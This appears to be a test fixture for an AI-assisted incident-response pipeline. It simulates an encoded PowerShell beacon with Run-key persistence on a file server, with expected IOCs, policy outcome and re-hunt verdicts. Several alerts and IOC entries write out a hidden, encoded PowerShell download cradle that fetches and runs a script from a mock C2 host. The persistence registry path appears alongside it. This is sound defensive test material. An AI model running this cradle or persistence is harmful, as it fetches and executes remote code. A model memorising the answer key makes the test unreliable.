@@ -1,0 +1,133 @@
+{
+  "id": "ATK-10",
+  "attackType": "POWERSHELL",
+  "title": "Encoded PowerShell beacon with Run-key persistence on a file server",
+  "description": "An encoded PowerShell beacon to vigix-mock-c2.net (45.155.205.233) on FILESRV-01 writes HKLM\\...\\Run\\WindowsUpdateSvc so it relaunches at boot. Policy (authoritative, verified in Task 8): CRITICAL severity on a tier2_high (not critical) asset -> IR_TEAM review, NO Manager approval (RULE-P04/P06 require a CRITICAL asset) - even though the AI suggests approval. The first response kills the process and blocks the C2 but misses the Run key, so the beacon returns after reboot (MATCH -> NOT_RESOLVED). After the Run key is removed, the re-hunt is clean.",
+  "alert": {
+    "id": "1726660200.10012",
+    "timestamp": "2026-09-18T11:50:00.000+0000",
+    "rule": {
+      "id": "100310",
+      "level": 14,
+      "description": "Encoded PowerShell command established Run-key persistence",
+      "groups": ["windows", "sysmon", "powershell", "persistence", "vigix_custom"],
+      "firedtimes": 1,
+      "mitre": { "id": ["T1547.001", "T1059.001"], "tactic": ["Persistence", "Execution"], "technique": ["Registry Run Keys / Startup Folder", "PowerShell"] }
+    },
+    "agent": { "id": "050", "name": "FILESRV-01", "ip": "10.0.2.50" },
+    "manager": { "name": "wazuh-manager" },
+    "decoder": { "name": "windows_eventchannel" },
+    "location": "EventChannel",
+    "data": {
+      "url": "http://vigix-mock-c2.net/beacon.ps1",
+      "dstip": "45.155.205.233",
+      "win": {
+        "system": { "eventID": "13", "channel": "Microsoft-Windows-Sysmon/Operational" },
+        "eventdata": {
+          "eventType": "SetValue",
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "targetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateSvc",
+          "details": "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgBpAGcAaQB4AC0AbQBvAGMAawAtAGMAMgAuAG4AZQB0AC8AYgBlAGEAYwBvAG4ALgBwAHMAMQAnACkA",
+          "user": "CORP\\svc_fileshare"
+        }
+      }
+    },
+    "full_log": "Registry value set: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateSvc = powershell.exe -NoP -W Hidden -Enc ... (decoded: IEX (New-Object Net.WebClient).DownloadString('http://vigix-mock-c2.net/beacon.ps1')) by powershell.exe user CORP\\svc_fileshare"
+  },
+  "relatedAlerts": [
+    {
+      "id": "1726660140.10013",
+      "timestamp": "2026-09-18T11:49:00.000+0000",
+      "rule": {
+        "id": "100300",
+        "level": 12,
+        "description": "PowerShell executed hidden with an encoded command (download cradle)",
+        "groups": ["windows", "sysmon", "powershell", "vigix_custom"],
+        "mitre": { "id": ["T1059.001"], "tactic": ["Execution"], "technique": ["PowerShell"] }
+      },
+      "agent": { "id": "050", "name": "FILESRV-01", "ip": "10.0.2.50" },
+      "decoder": { "name": "windows_eventchannel" },
+      "location": "EventChannel",
+      "data": {
+        "url": "http://vigix-mock-c2.net/beacon.ps1",
+        "dstip": "45.155.205.233",
+        "win": {
+          "system": { "eventID": "1" },
+          "eventdata": {
+            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "commandLine": "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgBpAGcAaQB4AC0AbQBvAGMAawAtAGMAMgAuAG4AZQB0AC8AYgBlAGEAYwBvAG4ALgBwAHMAMQAnACkA",
+            "parentImage": "C:\\Windows\\System32\\cmd.exe",
+            "user": "CORP\\svc_fileshare"
+          }
+        }
+      },
+      "full_log": "Process create: powershell.exe -NoP -W Hidden -Enc ... (decoded: IEX (New-Object Net.WebClient).DownloadString('http://vigix-mock-c2.net/beacon.ps1')) connected to 45.155.205.233:80"
+    }
+  ],
+  "expected": {
+    "severity": "critical",
+    "host": "FILESRV-01",
+    "mitreTechniques": ["T1547.001", "T1059.001"],
+    "iocs": [
+      { "type": "registry", "value": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateSvc" },
+      { "type": "command", "value": "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgBpAGcAaQB4AC0AbQBvAGMAawAtAGMAMgAuAG4AZQB0AC8AYgBlAGEAYwBvAG4ALgBwAHMAMQAnACkA" },
+      { "type": "process", "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" },
+      { "type": "url", "value": "http://vigix-mock-c2.net/beacon.ps1" },
+      { "type": "domain", "value": "vigix-mock-c2.net" },
+      { "type": "ip", "value": "45.155.205.233" }
+    ],
+    "policyInputs": { "assetTier": "tier2_high", "ruleLevel": 14 },
+    "approval": "POLICY_DECIDES",
+    "primaryResult": "NOT_RESOLVED",
+    "finalOutcome": "RESOLVED"
+  },
+  "response": {
+    "action": "Kill the PowerShell process on FILESRV-01 and block vigix-mock-c2.net / 45.155.205.233 at the perimeter",
+    "target": "FILESRV-01"
+  },
+  "rehunt": {
+    "rounds": [
+      {
+        "round": 1,
+        "scenario": "MATCH",
+        "expected": { "matchingEvents": 1, "iocRecurrence": true, "spreadDetected": false, "threatContained": false, "verification": "NOT_RESOLVED" },
+        "events": [
+          {
+            "id": "1726671000.10141",
+            "timestamp": "2026-09-18T14:50:00.000+0000",
+            "@timestamp": "2026-09-18T14:50:00.000Z",
+            "rule": { "id": "100300", "level": 12, "description": "PowerShell executed hidden with an encoded command (download cradle)", "groups": ["windows", "sysmon", "powershell", "vigix_custom"] },
+            "agent": { "id": "050", "name": "FILESRV-01", "ip": "10.0.2.50" },
+            "data": { "url": "http://vigix-mock-c2.net/beacon.ps1", "win": { "system": { "eventID": "1" }, "eventdata": { "parentImage": "C:\\Windows\\explorer.exe" } } },
+            "full_log": "Process create at logon (Run key WindowsUpdateSvc): powershell.exe -NoP -W Hidden -Enc ... (decoded: IEX (New-Object Net.WebClient).DownloadString('http://vigix-mock-c2.net/beacon.ps1'))"
+          },
+          {
+            "id": "1726671060.10142",
+            "timestamp": "2026-09-18T14:51:00.000+0000",
+            "@timestamp": "2026-09-18T14:51:00.000Z",
+            "rule": { "id": "61603", "level": 3, "description": "Sysmon - Event 1: Process creation", "groups": ["windows", "sysmon"] },
+            "agent": { "id": "050", "name": "FILESRV-01", "ip": "10.0.2.50" },
+            "data": { "win": { "system": { "eventID": "1" }, "eventdata": { "image": "C:\\Windows\\System32\\svchost.exe" } } },
+            "full_log": "Process create: svchost.exe -k netsvcs parent services.exe"
+          }
+        ]
+      },
+      {
+        "round": 2,
+        "scenario": "NO_MATCH",
+        "expected": { "matchingEvents": 0, "iocRecurrence": false, "spreadDetected": false, "threatContained": true, "verification": "RESOLVED" },
+        "events": [
+          {
+            "id": "1726678200.10151",
+            "timestamp": "2026-09-18T16:50:00.000+0000",
+            "@timestamp": "2026-09-18T16:50:00.000Z",
+            "rule": { "id": "61603", "level": 3, "description": "Sysmon - Event 1: Process creation", "groups": ["windows", "sysmon"] },
+            "agent": { "id": "050", "name": "FILESRV-01", "ip": "10.0.2.50" },
+            "data": { "win": { "system": { "eventID": "1" }, "eventdata": { "image": "C:\\Windows\\System32\\svchost.exe" } } },
+            "full_log": "Process create: svchost.exe -k netsvcs parent services.exe"
+          }
+        ]
+      }
+    ]
+  }
+}
